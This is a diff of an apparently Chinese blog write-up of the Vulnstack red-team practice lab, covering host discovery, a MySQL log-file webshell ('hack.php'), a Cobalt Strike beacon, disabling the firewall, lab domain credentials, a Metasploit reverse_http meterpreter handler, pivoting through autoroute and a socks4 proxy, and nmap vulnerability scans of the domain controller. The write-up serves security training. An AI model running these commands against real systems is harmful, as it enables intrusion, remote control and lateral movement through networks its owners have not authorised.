@@ -478,7 +478,7 @@
 
 <p>通过模拟真实环境搭建的漏洞靶场，完全模拟ATK&amp;CK攻击链路进行搭建，形成完整个闭环。虚拟机默认密码为hongrisec@2019。</p>
 <h3 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h3><p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316081903337.png"></p>
-<h2 id="0x03-攻入内网"><a href="#0x03-攻入内网" class="headerlink" title="0x03 攻入内网"></a>0x03 攻入内网</h2><h3 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1. 信息收集"></a>3.1. 信息收集</h3><h4 id="3-1-1-主机探测"><a href="#3-1-1-主机探测" class="headerlink" title="3.1.1 主机探测"></a>3.1.1 主机探测</h4><pre class="line-numbers language-none"><code class="language-none">netdiscover -i eth0 -r 192.168.1.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="0x03-漏洞发现及利用"><a href="#0x03-漏洞发现及利用" class="headerlink" title="0x03 漏洞发现及利用"></a>0x03 漏洞发现及利用</h2><h3 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1. 信息收集"></a>3.1. 信息收集</h3><h4 id="3-1-1-主机探测"><a href="#3-1-1-主机探测" class="headerlink" title="3.1.1 主机探测"></a>3.1.1 主机探测</h4><pre class="line-numbers language-none"><code class="language-none">netdiscover -i eth0 -r 192.168.1.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316083407043.png"></p>
 <h4 id="3-1-2-端口扫描"><a href="#3-1-2-端口扫描" class="headerlink" title="3.1.2 端口扫描"></a>3.1.2 端口扫描</h4><p>​    发现IP192.168.1.102，使用nmap探测其端口开放情况</p>
@@ -537,7 +537,6 @@ set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;hack.php&#3
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113709282.png"></p>
 <h3 id="3-3-CS上线GetShell"><a href="#3-3-CS上线GetShell" class="headerlink" title="3.3 CS上线GetShell"></a>3.3 CS上线GetShell</h3><p>CS客户端服务端都部署在192.168.1.5主机上，创建监听并生成powershell</p>
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316115646878.png"></p>
-<p>时间反应比较慢，建议多执行几次并等一会</p>
 <p>提权成功</p>
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316120020075.png"></p>
 <h3 id="3-4-系统信息收集"><a href="#3-4-系统信息收集" class="headerlink" title="3.4 系统信息收集"></a>3.4 系统信息收集</h3><p>查看网卡</p>
@@ -566,13 +565,46 @@ netsh advfirewall <span class="token builtin class-name">set</span> allprofiles 
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121449483.png"></p>
 <p>这个时候防火墙是开启，我们需要关闭防火墙，使用域用户god\administrator&#x2F;hongrisec@2020成功登录这一台win7WEB主机</p>
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121709477.png"></p>
-<h2 id="0x04-内网信息收集"><a href="#0x04-内网信息收集" class="headerlink" title="0x04 内网信息收集"></a>0x04 内网信息收集</h2><h3 id="4-1-域信息收集"><a href="#4-1-域信息收集" class="headerlink" title="4.1 域信息收集"></a>4.1 域信息收集</h3><p>前面收集到的信息Win7计算机名字为STU1，另外还有两个域用户分别是DEV1、ROOT-TVI862UBEH、域控制用户为OWA</p>
-<p>win7内网的IP地址为192.168.52.143</p>
-<p>进一步开始收集，这里使用k8gege开发的cobalt strick ladon插件直接进行域内存活主机探测</p>
-<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316123002914.png"></p>
-<p>域成员：192.168.52.141</p>
-<p>域控DC：192.168.52.138</p>
-<h3 id="4-5-内网漏洞扫描"><a href="#4-5-内网漏洞扫描" class="headerlink" title="4.5 内网漏洞扫描"></a>4.5 内网漏洞扫描</h3><p>前期我们获取到win7的远程桌面也可以通过远程发现win7主机上安装了nmap工具，我们可以进一步针对192.168.52.0&#x2F;24内网网段进行漏洞信息收集</p>
+<h2 id="0x04-攻入内网及横向移动"><a href="#0x04-攻入内网及横向移动" class="headerlink" title="0x04 攻入内网及横向移动"></a>0x04 攻入内网及横向移动</h2><p>注意：这里已经在cs端进行了提权</p>
+<h3 id="4-1-将cs会话派生给msf"><a href="#4-1-将cs会话派生给msf" class="headerlink" title="4.1 将cs会话派生给msf"></a>4.1 将cs会话派生给msf</h3><p>打开MSF，开始监听</p>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
+set payload windows&#x2F;meterpreter&#x2F;reverse_http
+set lhost 192.168.1.5
+set lport 8888
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318163608922.png"></p>
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318170258970.png" alt="image-20220318170258970"></p>
+<h3 id="4-2-内网–继续信息收集"><a href="#4-2-内网–继续信息收集" class="headerlink" title="4.2 内网–继续信息收集"></a>4.2 内网–继续信息收集</h3><h4 id="4-2-1-补丁信息"><a href="#4-2-1-补丁信息" class="headerlink" title="4.2.1 补丁信息"></a>4.2.1 补丁信息</h4><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_patches<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318173346684.png"></p>
+<h4 id="5-2-2-软件安装信息"><a href="#5-2-2-软件安装信息" class="headerlink" title="5.2.2 软件安装信息"></a>5.2.2 软件安装信息</h4><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_applications<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318173500987.png"></p>
+<h4 id="5-2-3-路由信息并添加路由"><a href="#5-2-3-路由信息并添加路由" class="headerlink" title="5.2.3 路由信息并添加路由"></a>5.2.3 路由信息并添加路由</h4><p>添加路由到目标环境网络，使得msf能够通过win7路由转发访问192.168.25.0&#x2F;24网段</p>
+<pre class="line-numbers language-none"><code class="language-none">#查看路由信息
+run get_local_subnets
+#添加一条路由
+run autoroute -s 192.168.52.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318173738839.png"></p>
+<p>使用msf的socks4代理模块</p>
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318164436351.png"></p>
+<p>文本编辑器修改<code>etc/proxychains.conf</code>，在最后一行加上socks4代理服务器</p>
+<pre class="line-numbers language-none"><code class="language-none">[ProxyList]
+
+socks4 192.168.1.5 1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>之后我们就可以使用proxychains代理nmap扫描主机</p>
+<h4 id="5-2-4-arp扫描内网主机"><a href="#5-2-4-arp扫描内网主机" class="headerlink" title="5.2.4 arp扫描内网主机"></a>5.2.4 arp扫描内网主机</h4><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.52.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318174314595.png"></p>
+<h4 id="5-2-5-内网扫描"><a href="#5-2-5-内网扫描" class="headerlink" title="5.2.5 内网扫描"></a>5.2.5 内网扫描</h4><p>扫描域控开放的端口及存在的相应漏洞</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains nmap -sT -sV -Pn -p22,80,443,135,445 --script&#x3D;vuln 192.168.52.138<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318184046567.png"></p>
+<p>挂代理访问域控的80端口</p>
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318184117657.png"></p>
 
                 
             </div>
